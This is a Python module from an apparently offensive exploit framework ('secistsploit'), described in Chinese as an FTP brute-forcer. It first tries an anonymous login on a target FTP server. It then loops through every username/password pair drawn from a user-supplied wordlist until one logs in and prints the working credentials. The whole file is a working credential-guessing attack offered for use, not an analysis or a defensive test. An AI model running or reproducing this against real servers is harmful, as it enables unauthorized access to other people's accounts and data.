# -*- coding: UTF-8 -*-

from secistsploit.core.exploit import *
from secistsploit.core.ftp.ftp_client import FTPClient
import ftplib
import os


class  Exploit(FTPClient):
    '''
    FTP爆破
    '''
    __info__ = {
        "name": "python_ftp",
        "description": "python_ftp",
        "authors": (
            "只因不值得",
        ),
        "references": (
             "www.sariel.top"
        ),

    }

    target = OptIP("","目标地址")
    port = OptPort("","FTP端口")

    if port == "":
        port = OptPort(21, "FTP端口")

    def AnonLogin(self):
        '''
        使用FTP默认账户进行尝试
        :return:
        '''
        try:
            ftp = ftplib.FTP(self.target)
            x = ftp.connect(self.target, self.port, 1)
            print(x)
            ftp.login('anonymous', 'anonymous')
            print('[+] ' + str(self.target) + ' Login Succeeded.')
            return True
        except Exception as e:
            print('[-] ' + str(self.target) + ' Login Failed.')
            return False

    def run(self):
        if self.target == "":
            print('[-] Not target set')
        anon = self.AnonLogin()
        if anon == True:
            return 0
        filename = input('filename_pwd > ')
        file = os.path.exists(filename)
        if file != True:
            print('[-] File does not exist')
            return 0
        username = open(filename, 'r')
        user = [i.rstrip('\n') for i in username if i != '\n']
        for i in user:
            for j in user:
                print('[+] Trying：' + i + ':' + j)
                try:
                    ftp = ftplib.FTP(self.target)
                    ftp.connect(self.target,self.port,1)
                    ftp.login(i, j)
                    print('\n[*] ' + str(self.target))
                    print('FTP Login Succeeded：' + i + ':' + j)
                    ftp.quit()
                    return (i, j)
                except Exception as e:
                    pass
        print('\n[-] Could bot brute force FTP credentials.')
        print('Ps：You may be able to try changing ports')